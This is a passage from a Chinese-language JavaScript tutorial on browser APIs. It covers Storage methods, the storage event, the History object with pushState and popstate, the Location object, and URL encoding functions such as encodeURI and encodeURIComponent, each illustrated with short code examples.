<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable language_">sessionStorage</span>.<span class="title function_">removeItem</span>(<span class="string">&#x27;key&#x27;</span>);</span><br><span class="line"><span class="variable language_">localStorage</span>.<span class="title function_">removeItem</span>(<span class="string">&#x27;key&#x27;</span>);</span><br></pre></td></tr></table></figure>



<h4 id="2-4-Storage-clear"><a href="#2-4-Storage-clear" class="headerlink" title="2.4 Storage.clear()"></a>2.4 Storage.clear()</h4><p><code>Storage.clear()</code>方法用于清除所有保存的数据。该方法的返回值是<code>undefined</code>。</p>
<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable language_">window</span>.<span class="property">sessionStorage</span>.<span class="title function_">clear</span>()</span><br><span class="line"><span class="variable language_">window</span>.<span class="property">localStorage</span>.<span class="title function_">clear</span>()</span><br></pre></td></tr></table></figure>



<h4 id="2-5-Storage-key"><a href="#2-5-Storage-key" class="headerlink" title="2.5 Storage.key()"></a>2.5 Storage.key()</h4><p><code>Storage.key()</code>接受一个整数作为参数（从零开始），返回该位置对应的键值。</p>
<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable language_">window</span>.<span class="property">sessionStorage</span>.<span class="title function_">setItem</span>(<span class="string">&#x27;key&#x27;</span>, <span class="string">&#x27;value&#x27;</span>);</span><br><span class="line"><span class="variable language_">window</span>.<span class="property">sessionStorage</span>.<span class="title function_">key</span>(<span class="number">0</span>) <span class="comment">// &quot;key&quot;</span></span><br></pre></td></tr></table></figure>

<p>结合使用<code>Storage.length</code>属性和<code>Storage.key()</code>方法，可以遍历所有的键。</p>
<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">for</span> (<span class="keyword">var</span> i = <span class="number">0</span>; i &lt; <span class="variable language_">window</span>.<span class="property">localStorage</span>.<span class="property">length</span>; i++) &#123;</span><br><span class="line">  <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="variable language_">localStorage</span>.<span class="title function_">key</span>(i));</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>



<h3 id="3、storage-事件"><a href="#3、storage-事件" class="headerlink" title="3、storage 事件"></a>3、storage 事件</h3><p>Storage 接口储存的数据发生变化时，会触发 storage 事件，可以指定这个事件的监听函数。</p>
<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable language_">window</span>.<span class="title function_">addEventListener</span>(<span class="string">&#x27;storage&#x27;</span>, onStorageChange);</span><br></pre></td></tr></table></figure>

<p>监听函数接受一个<code>event</code>实例对象作为参数。这个实例对象继承了 StorageEvent 接口，有几个特有的属性，都是只读属性。</p>
<ul>
<li><code>StorageEvent.key</code>：字符串，表示发生变动的键名。如果 storage 事件是由<code>clear()</code>方法引起，该属性返回<code>null</code>。</li>
<li><code>StorageEvent.newValue</code>：字符串，表示新的键值。如果 storage 事件是由<code>clear()</code>方法或删除该键值对引发的，该属性返回<code>null</code>。</li>
<li><code>StorageEvent.oldValue</code>：字符串，表示旧的键值。如果该键值对是新增的，该属性返回<code>null</code>。</li>
<li><code>StorageEvent.storageArea</code>：对象，返回键值对所在的整个对象。也说是说，可以从这个属性上面拿到当前域名储存的所有键值对。</li>
<li><code>StorageEvent.url</code>：字符串，表示原始触发 storage 事件的那个网页的网址。</li>
</ul>
<p>下面是<code>StorageEvent.key</code>属性的例子。</p>
<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">function</span> <span class="title function_">onStorageChange</span>(<span class="params">e</span>) &#123;</span><br><span class="line">  <span class="variable language_">console</span>.<span class="title function_">log</span>(e.<span class="property">key</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable language_">window</span>.<span class="title function_">addEventListener</span>(<span class="string">&#x27;storage&#x27;</span>, onStorageChange);</span><br></pre></td></tr></table></figure>

<p>注意，该事件有一个很特别的地方，就是它不在导致数据变化的当前页面触发，而是在同一个域名的其他窗口触发。也就是说，如果浏览器只打开一个窗口，可能观察不到这个事件。比如同时打开多个窗口，当其中的一个窗口导致储存的数据发生改变时，只有在其他窗口才能观察到监听函数的执行。可以通过这种机制，实现多个窗口之间的通信。	</p>
<h2 id="九、History-对象"><a href="#九、History-对象" class="headerlink" title="九、History 对象"></a>九、History 对象</h2><h3 id="1、概述-4"><a href="#1、概述-4" class="headerlink" title="1、概述"></a>1、概述</h3><p><code>window.history</code>属性指向 History 对象，它表示当前窗口的浏览历史。</p>
<p>History 对象保存了当前窗口访问过的所有页面网址。下面代码表示当前窗口一共访问过3个网址。</p>
<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable language_">window</span>.<span class="property">history</span>.<span class="property">length</span> <span class="comment">// 3</span></span><br></pre></td></tr></table></figure>

<p>由于安全原因，浏览器不允许脚本读取这些地址，但是允许在地址之间导航。</p>
<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 后退到前一个网址</span></span><br><span class="line">history.<span class="title function_">back</span>()</span><br><span class="line"></span><br><span class="line"><span class="comment">// 等同于</span></span><br><span class="line">history.<span class="title function_">go</span>(-<span class="number">1</span>)</span><br></pre></td></tr></table></figure>

<p>浏览器工具栏的“前进”和“后退”按钮，其实就是对 History 对象进行操作。</p>
<h3 id="2、属性"><a href="#2、属性" class="headerlink" title="2、属性"></a>2、属性</h3><p>History 对象主要有两个属性。</p>
<ul>
<li><code>History.length</code>：当前窗口访问过的网址数量（包括当前网页）</li>
<li><code>History.state</code>：History 堆栈最上层的状态值（详见下文）</li>
</ul>
<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 当前窗口访问过多少个网页</span></span><br><span class="line"><span class="variable language_">window</span>.<span class="property">history</span>.<span class="property">length</span> <span class="comment">// 1</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// History 对象的当前状态</span></span><br><span class="line"><span class="comment">// 通常是 undefined，即未设置</span></span><br><span class="line"><span class="variable language_">window</span>.<span class="property">history</span>.<span class="property">state</span> <span class="comment">// undefined</span></span><br></pre></td></tr></table></figure>



<h3 id="3、方法"><a href="#3、方法" class="headerlink" title="3、方法"></a>3、方法</h3><h4 id="3-1-History-back-、History-forward-、History-go"><a href="#3-1-History-back-、History-forward-、History-go" class="headerlink" title="3.1 History.back()、History.forward()、History.go()"></a>3.1 History.back()、History.forward()、History.go()</h4><p>这三个方法用于在历史之中移动。</p>
<ul>
<li><code>History.back()</code>：移动到上一个网址，等同于点击浏览器的后退键。对于第一个访问的网址，该方法无效果。</li>
<li><code>History.forward()</code>：移动到下一个网址，等同于点击浏览器的前进键。对于最后一个访问的网址，该方法无效果。</li>
<li><code>History.go()</code>：接受一个整数作为参数，以当前网址为基准，移动到参数指定的网址，比如<code>go(1)</code>相当于<code>forward()</code>，<code>go(-1)</code>相当于<code>back()</code>。如果参数超过实际存在的网址范围，该方法无效果；如果不指定参数，默认参数为<code>0</code>，相当于刷新当前页面。</li>
</ul>
<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">history.<span class="title function_">back</span>();</span><br><span class="line">history.<span class="title function_">forward</span>();</span><br><span class="line">history.<span class="title function_">go</span>(-<span class="number">2</span>);</span><br></pre></td></tr></table></figure>

<p><code>history.go(0)</code>相当于刷新当前页面。</p>
<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">history.<span class="title function_">go</span>(<span class="number">0</span>); <span class="comment">// 刷新当前页面</span></span><br></pre></td></tr></table></figure>

<p>注意，移动到以前访问过的页面时，页面通常是从浏览器缓存之中加载，而不是重新要求服务器发送新的网页。</p>
<h4 id="3-2-History-pushState-，"><a href="#3-2-History-pushState-，" class="headerlink" title="3.2 History.pushState()，"></a>3.2 History.pushState()，</h4><p><code>History.pushState()</code>方法用于在历史中添加一条记录。</p>
<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable language_">window</span>.<span class="property">history</span>.<span class="title function_">pushState</span>(state, title, url)</span><br></pre></td></tr></table></figure>

<p>该方法接受三个参数，依次为：</p>
<ul>
<li><code>state</code>：一个与添加的记录相关联的状态对象，主要用于<code>popstate</code>事件。该事件触发时，该对象会传入回调函数。也就是说，浏览器会将这个对象序列化以后保留在本地，重新载入这个页面的时候，可以拿到这个对象。如果不需要这个对象，此处可以填<code>null</code>。</li>
<li><code>title</code>：新页面的标题。但是，现在所有浏览器都忽视这个参数，所以这里可以填空字符串。</li>
<li><code>url</code>：新的网址，必须与当前页面处在同一个域。浏览器的地址栏将显示这个网址。</li>
</ul>
<p>假定当前网址是<code>example.com/1.html</code>，使用<code>pushState()</code>方法在浏览记录（History 对象）中添加一个新记录。</p>
<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> stateObj = &#123; <span class="attr">foo</span>: <span class="string">&#x27;bar&#x27;</span> &#125;;</span><br><span class="line">history.<span class="title function_">pushState</span>(stateObj, <span class="string">&#x27;page 2&#x27;</span>, <span class="string">&#x27;2.html&#x27;</span>);</span><br></pre></td></tr></table></figure>

<p>添加新记录后，浏览器地址栏立刻显示<code>example.com/2.html</code>，但并不会跳转到<code>2.html</code>，甚至也不会检查<code>2.html</code>是否存在，它只是成为浏览历史中的最新记录。这时，在地址栏输入一个新的地址(比如访问<code>google.com</code>)，然后点击了倒退按钮，页面的 URL 将显示<code>2.html</code>；你再点击一次倒退按钮，URL 将显示<code>1.html</code>。</p>
<p>总之，<code>pushState()</code>方法不会触发页面刷新，只是导致 History 对象发生变化，地址栏会有反应。</p>
<p>使用该方法之后，就可以用<code>History.state</code>属性读出状态对象。</p>
<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> stateObj = &#123; <span class="attr">foo</span>: <span class="string">&#x27;bar&#x27;</span> &#125;;</span><br><span class="line">history.<span class="title function_">pushState</span>(stateObj, <span class="string">&#x27;page 2&#x27;</span>, <span class="string">&#x27;2.html&#x27;</span>);</span><br><span class="line">history.<span class="property">state</span> <span class="comment">// &#123;foo: &quot;bar&quot;&#125;</span></span><br></pre></td></tr></table></figure>

<p>如果<code>pushState</code>的 URL 参数设置了一个新的锚点值（即<code>hash</code>），并不会触发<code>hashchange</code>事件。反过来，如果 URL 的锚点值变了，则会在 History 对象创建一条浏览记录。</p>
<p>如果<code>pushState()</code>方法设置了一个跨域网址，则会报错。</p>
<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 报错</span></span><br><span class="line"><span class="comment">// 当前网址为 http://example.com</span></span><br><span class="line">history.<span class="title function_">pushState</span>(<span class="literal">null</span>, <span class="string">&#x27;&#x27;</span>, <span class="string">&#x27;https://twitter.com/hello&#x27;</span>);</span><br></pre></td></tr></table></figure>

<p>上面代码中，<code>pushState</code>想要插入一个跨域的网址，导致报错。这样设计的目的是，防止恶意代码让用户以为他们是在另一个网站上，因为这个方法不会导致页面跳转。</p>
<h4 id="3-3-History-replaceState"><a href="#3-3-History-replaceState" class="headerlink" title="3.3 History.replaceState()"></a>3.3 History.replaceState()</h4><p><code>History.replaceState()</code>方法用来修改 History 对象的当前记录，其他都与<code>pushState()</code>方法一模一样。</p>
<p>假定当前网页是<code>example.com/example.html</code>。</p>
<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">history.<span class="title function_">pushState</span>(&#123;<span class="attr">page</span>: <span class="number">1</span>&#125;, <span class="string">&#x27;title 1&#x27;</span>, <span class="string">&#x27;?page=1&#x27;</span>)</span><br><span class="line"><span class="comment">// URL 显示为 http://example.com/example.html?page=1</span></span><br><span class="line"></span><br><span class="line">history.<span class="title function_">pushState</span>(&#123;<span class="attr">page</span>: <span class="number">2</span>&#125;, <span class="string">&#x27;title 2&#x27;</span>, <span class="string">&#x27;?page=2&#x27;</span>);</span><br><span class="line"><span class="comment">// URL 显示为 http://example.com/example.html?page=2</span></span><br><span class="line"></span><br><span class="line">history.<span class="title function_">replaceState</span>(&#123;<span class="attr">page</span>: <span class="number">3</span>&#125;, <span class="string">&#x27;title 3&#x27;</span>, <span class="string">&#x27;?page=3&#x27;</span>);</span><br><span class="line"><span class="comment">// URL 显示为 http://example.com/example.html?page=3</span></span><br><span class="line"></span><br><span class="line">history.<span class="title function_">back</span>()</span><br><span class="line"><span class="comment">// URL 显示为 http://example.com/example.html?page=1</span></span><br><span class="line"></span><br><span class="line">history.<span class="title function_">back</span>()</span><br><span class="line"><span class="comment">// URL 显示为 http://example.com/example.html</span></span><br><span class="line"></span><br><span class="line">history.<span class="title function_">go</span>(<span class="number">2</span>)</span><br><span class="line"><span class="comment">// URL 显示为 http://example.com/example.html?page=3</span></span><br></pre></td></tr></table></figure>



<h3 id="4、popstate-事件"><a href="#4、popstate-事件" class="headerlink" title="4、popstate 事件"></a>4、popstate 事件</h3><p>每当同一个文档的浏览历史（即<code>history</code>对象）出现变化时，就会触发<code>popstate</code>事件。</p>
<p>注意，仅仅调用<code>pushState()</code>方法或<code>replaceState()</code>方法 ，并不会触发该事件，只有用户点击浏览器倒退按钮和前进按钮，或者使用 JavaScript 调用<code>History.back()</code>、<code>History.forward()</code>、<code>History.go()</code>方法时才会触发。另外，该事件只针对同一个文档，如果浏览历史的切换，导致加载不同的文档，该事件也不会触发。</p>
<p>使用的时候，可以为<code>popstate</code>事件指定回调函数。</p>
<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable language_">window</span>.<span class="property">onpopstate</span> = <span class="keyword">function</span> (<span class="params">event</span>) &#123;</span><br><span class="line">  <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&#x27;location: &#x27;</span> + <span class="variable language_">document</span>.<span class="property">location</span>);</span><br><span class="line">  <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&#x27;state: &#x27;</span> + <span class="title class_">JSON</span>.<span class="title function_">stringify</span>(event.<span class="property">state</span>));</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 或者</span></span><br><span class="line"><span class="variable language_">window</span>.<span class="title function_">addEventListener</span>(<span class="string">&#x27;popstate&#x27;</span>, <span class="keyword">function</span>(<span class="params">event</span>) &#123;</span><br><span class="line">  <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&#x27;location: &#x27;</span> + <span class="variable language_">document</span>.<span class="property">location</span>);</span><br><span class="line">  <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&#x27;state: &#x27;</span> + <span class="title class_">JSON</span>.<span class="title function_">stringify</span>(event.<span class="property">state</span>));</span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure>

<p>回调函数的参数是一个<code>event</code>事件对象，它的<code>state</code>属性指向<code>pushState</code>和<code>replaceState</code>方法为当前 URL 所提供的状态对象（即这两个方法的第一个参数）。上面代码中的<code>event.state</code>，就是通过<code>pushState</code>和<code>replaceState</code>方法，为当前 URL 绑定的<code>state</code>对象。</p>
<p>这个<code>state</code>对象也可以直接通过<code>history</code>对象读取。</p>
<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> currentState = history.<span class="property">state</span>;</span><br></pre></td></tr></table></figure>

<p>注意，页面第一次加载的时候，浏览器不会触发<code>popstate</code>事件。</p>
<h2 id="十、Location-对象，URL-对象，URLSearchParams-对象"><a href="#十、Location-对象，URL-对象，URLSearchParams-对象" class="headerlink" title="十、Location 对象，URL 对象，URLSearchParams 对象"></a>十、Location 对象，URL 对象，URLSearchParams 对象</h2><p> URL 是互联网的基础设施之一。浏览器提供了一些原生对象，用来管理 URL。 </p>
<h3 id="1、Location-对象"><a href="#1、Location-对象" class="headerlink" title="1、Location 对象"></a>1、Location 对象</h3><p><code>Location</code>对象是浏览器提供的原生对象，提供 URL 相关的信息和操作方法。通过<code>window.location</code>和<code>document.location</code>属性，可以拿到这个对象。</p>
<h4 id="1-1-属性"><a href="#1-1-属性" class="headerlink" title="1.1 属性"></a>1.1 属性</h4><p><code>Location</code>对象提供以下属性。</p>
<ul>
<li><code>Location.href</code>：整个 URL。</li>
<li><code>Location.protocol</code>：当前 URL 的协议，包括冒号（<code>:</code>）。</li>
<li><code>Location.host</code>：主机。如果端口不是协议默认的<code>80</code>和<code>433</code>，则还会包括冒号（<code>:</code>）和端口。</li>
<li><code>Location.hostname</code>：主机名，不包括端口。</li>
<li><code>Location.port</code>：端口号。</li>
<li><code>Location.pathname</code>：URL 的路径部分，从根路径<code>/</code>开始。</li>
<li><code>Location.search</code>：查询字符串部分，从问号<code>?</code>开始。</li>
<li><code>Location.hash</code>：片段字符串部分，从<code>#</code>开始。</li>
<li><code>Location.username</code>：域名前面的用户名。</li>
<li><code>Location.password</code>：域名前面的密码。</li>
<li><code>Location.origin</code>：URL 的协议、主机名和端口。</li>
</ul>
<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 当前网址为</span></span><br><span class="line"><span class="comment">// http://user:passwd@www.example.com:4097/path/a.html?x=111#part1</span></span><br><span class="line"><span class="variable language_">document</span>.<span class="property">location</span>.<span class="property">href</span></span><br><span class="line"><span class="comment">// &quot;http://user:passwd@www.example.com:4097/path/a.html?x=111#part1&quot;</span></span><br><span class="line"><span class="variable language_">document</span>.<span class="property">location</span>.<span class="property">protocol</span></span><br><span class="line"><span class="comment">// &quot;http:&quot;</span></span><br><span class="line"><span class="variable language_">document</span>.<span class="property">location</span>.<span class="property">host</span></span><br><span class="line"><span class="comment">// &quot;www.example.com:4097&quot;</span></span><br><span class="line"><span class="variable language_">document</span>.<span class="property">location</span>.<span class="property">hostname</span></span><br><span class="line"><span class="comment">// &quot;www.example.com&quot;</span></span><br><span class="line"><span class="variable language_">document</span>.<span class="property">location</span>.<span class="property">port</span></span><br><span class="line"><span class="comment">// &quot;4097&quot;</span></span><br><span class="line"><span class="variable language_">document</span>.<span class="property">location</span>.<span class="property">pathname</span></span><br><span class="line"><span class="comment">// &quot;/path/a.html&quot;</span></span><br><span class="line"><span class="variable language_">document</span>.<span class="property">location</span>.<span class="property">search</span></span><br><span class="line"><span class="comment">// &quot;?x=111&quot;</span></span><br><span class="line"><span class="variable language_">document</span>.<span class="property">location</span>.<span class="property">hash</span></span><br><span class="line"><span class="comment">// &quot;#part1&quot;</span></span><br><span class="line"><span class="variable language_">document</span>.<span class="property">location</span>.<span class="property">username</span></span><br><span class="line"><span class="comment">// &quot;user&quot;</span></span><br><span class="line"><span class="variable language_">document</span>.<span class="property">location</span>.<span class="property">password</span></span><br><span class="line"><span class="comment">// &quot;passwd&quot;</span></span><br><span class="line"><span class="variable language_">document</span>.<span class="property">location</span>.<span class="property">origin</span></span><br><span class="line"><span class="comment">// &quot;http://user:passwd@www.example.com:4097&quot;</span></span><br></pre></td></tr></table></figure>

<p>这些属性里面，只有<code>origin</code>属性是只读的，其他属性都可写。</p>
<p>注意，如果对<code>Location.href</code>写入新的 URL 地址，浏览器会立刻跳转到这个新地址。</p>
<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 跳转到新网址</span></span><br><span class="line"><span class="variable language_">document</span>.<span class="property">location</span>.<span class="property">href</span> = <span class="string">&#x27;http://www.example.com&#x27;</span>;</span><br></pre></td></tr></table></figure>

<p>这个特性常常用于让网页自动滚动到新的锚点。</p>
<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable language_">document</span>.<span class="property">location</span>.<span class="property">href</span> = <span class="string">&#x27;#top&#x27;</span>;</span><br><span class="line"><span class="comment">// 等同于</span></span><br><span class="line"><span class="variable language_">document</span>.<span class="property">location</span>.<span class="property">hash</span> = <span class="string">&#x27;#top&#x27;</span>;</span><br></pre></td></tr></table></figure>

<p>直接改写<code>location</code>，相当于写入<code>href</code>属性。</p>
<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable language_">document</span>.<span class="property">location</span> = <span class="string">&#x27;http://www.example.com&#x27;</span>;</span><br><span class="line"><span class="comment">// 等同于</span></span><br><span class="line"><span class="variable language_">document</span>.<span class="property">location</span>.<span class="property">href</span> = <span class="string">&#x27;http://www.example.com&#x27;</span>;</span><br></pre></td></tr></table></figure>

<p>另外，<code>Location.href</code>属性是浏览器唯一允许跨域写入的属性，即非同源的窗口可以改写另一个窗口（比如子窗口与父窗口）的<code>Location.href</code>属性，导致后者的网址跳转。<code>Location</code>的其他属性都不允许跨域写入。</p>
<h4 id="1-2-方法"><a href="#1-2-方法" class="headerlink" title="1.2 方法"></a>1.2 方法</h4><p><strong>（1）Location.assign()</strong></p>
<p><code>assign</code>方法接受一个 URL 字符串作为参数，使得浏览器立刻跳转到新的 URL。如果参数不是有效的 URL 字符串，则会报错。</p>
<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 跳转到新的网址</span></span><br><span class="line"><span class="variable language_">document</span>.<span class="property">location</span>.<span class="title function_">assign</span>(<span class="string">&#x27;http://www.example.com&#x27;</span>)</span><br></pre></td></tr></table></figure>

<p><strong>（2）Location.replace()</strong></p>
<p><code>replace</code>方法接受一个 URL 字符串作为参数，使得浏览器立刻跳转到新的 URL。如果参数不是有效的 URL 字符串，则会报错。</p>
<p>它与<code>assign</code>方法的差异在于，<code>replace</code>会在浏览器的浏览历史<code>History</code>里面删除当前网址，也就是说，一旦使用了该方法，后退按钮就无法回到当前网页了，相当于在浏览历史里面，使用新的 URL 替换了老的 URL。它的一个应用是，当脚本发现当前是移动设备时，就立刻跳转到移动版网页。</p>
<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 跳转到新的网址</span></span><br><span class="line"><span class="variable language_">document</span>.<span class="property">location</span>.<span class="title function_">replace</span>(<span class="string">&#x27;http://www.example.com&#x27;</span>)</span><br></pre></td></tr></table></figure>

<p><strong>（3）Location.reload()</strong></p>
<p><code>reload</code>方法使得浏览器重新加载当前网址，相当于按下浏览器的刷新按钮。</p>
<p>它接受一个布尔值作为参数。如果参数为<code>true</code>，浏览器将向服务器重新请求这个网页，并且重新加载后，网页将滚动到头部（即<code>scrollTop === 0</code>）。如果参数是<code>false</code>或为空，浏览器将从本地缓存重新加载该网页，并且重新加载后，网页的视口位置是重新加载前的位置。</p>
<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 向服务器重新请求当前网址</span></span><br><span class="line"><span class="variable language_">window</span>.<span class="property">location</span>.<span class="title function_">reload</span>(<span class="literal">true</span>);</span><br></pre></td></tr></table></figure>

<p><strong>（4）Location.toString()</strong></p>
<p><code>toString</code>方法返回整个 URL 字符串，相当于读取<code>Location.href</code>属性。</p>
<h3 id="2、URL-的编码和解码"><a href="#2、URL-的编码和解码" class="headerlink" title="2、URL 的编码和解码"></a>2、URL 的编码和解码</h3><p>网页的 URL 只能包含合法的字符。合法字符分成两类。</p>
<ul>
<li>URL 元字符：分号（<code>;</code>），逗号（<code>,</code>），斜杠（<code>/</code>），问号（<code>?</code>），冒号（<code>:</code>），at（<code>@</code>），<code>&amp;</code>，等号（<code>=</code>），加号（<code>+</code>），美元符号（<code>$</code>），井号（<code>#</code>）</li>
<li>语义字符：<code>a-z</code>，<code>A-Z</code>，<code>0-9</code>，连词号（<code>-</code>），下划线（<code>_</code>），点（<code>.</code>），感叹号（<code>!</code>），波浪线（<code>~</code>），星号（<code>*</code>），单引号（<code>&#39;</code>），圆括号（<code>()</code>）</li>
</ul>
<p>除了以上字符，其他字符出现在 URL 之中都必须转义，规则是根据操作系统的默认编码，将每个字节转为百分号（<code>%</code>）加上两个大写的十六进制字母。</p>
<p>比如，UTF-8 的操作系统上，<code>http://www.example.com/q=春节</code>这个 URL 之中，汉字“春节”不是 URL 的合法字符，所以被浏览器自动转成<code>http://www.example.com/q=%E6%98%A5%E8%8A%82</code>。其中，“春”转成了<code>%E6%98%A5</code>，“节”转成了<code>%E8%8A%82</code>。这是因为“春”和“节”的 UTF-8 编码分别是<code>E6 98 A5</code>和<code>E8 8A 82</code>，将每个字节前面加上百分号，就构成了 URL 编码。</p>
<p>JavaScript 提供四个 URL 的编码&#x2F;解码方法。</p>
<ul>
<li><code>encodeURI()</code></li>
<li><code>encodeURIComponent()</code></li>
<li><code>decodeURI()</code></li>
<li><code>decodeURIComponent()</code></li>
</ul>
<h4 id="2-1-encodeURI"><a href="#2-1-encodeURI" class="headerlink" title="2.1 encodeURI()"></a>2.1 encodeURI()</h4><p><code>encodeURI()</code>方法用于转码整个 URL。它的参数是一个字符串，代表整个 URL。它会将元字符和语义字符之外的字符，都进行转义。</p>
<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">encodeURI</span>(<span class="string">&#x27;http://www.example.com/q=春节&#x27;</span>)</span><br><span class="line"><span class="comment">// &quot;http://www.example.com/q=%E6%98%A5%E8%8A%82&quot;</span></span><br></pre></td></tr></table></figure>



<h4 id="2-2-encodeURIComponent"><a href="#2-2-encodeURIComponent" class="headerlink" title="2.2 encodeURIComponent()"></a>2.2 encodeURIComponent()</h4><p><code>encodeURIComponent()</code>方法用于转码 URL 的组成部分，会转码除了语义字符之外的所有字符，即元字符也会被转码。所以，它不能用于转码整个 URL。它接受一个参数，就是 URL 的片段。</p>
<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">encodeURIComponent</span>(<span class="string">&#x27;春节&#x27;</span>)</span><br><span class="line"><span class="comment">// &quot;%E6%98%A5%E8%8A%82&quot;</span></span><br><span class="line"><span class="built_in">encodeURIComponent</span>(<span class="string">&#x27;http://www.example.com/q=春节&#x27;</span>)</span><br><span class="line"><span class="comment">// &quot;http%3A%2F%2Fwww.example.com%2Fq%3D%E6%98%A5%E8%8A%82&quot;</span></span><br></pre></td></tr></table></figure>

<p>上面代码中，<code>encodeURIComponent()</code>会连 URL 元字符一起转义，所以如果转码整个 URL 就会出错。</p>
<h4 id="2-3-decodeURI"><a href="#2-3-decodeURI" class="headerlink" title="2.3 decodeURI()"></a>2.3 decodeURI()</h4><p><code>decodeURI()</code>方法用于整个 URL 的解码。它是<code>encodeURI()</code>方法的逆运算。它接受一个参数，就是转码后的 URL。</p>
<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">decodeURI</span>(<span class="string">&#x27;http://www.example.com/q=%E6%98%A5%E8%8A%82&#x27;</span>)</span><br><span class="line"><span class="comment">// &quot;http://www.example.com/q=春节&quot;</span></span><br></pre></td></tr></table></figure>



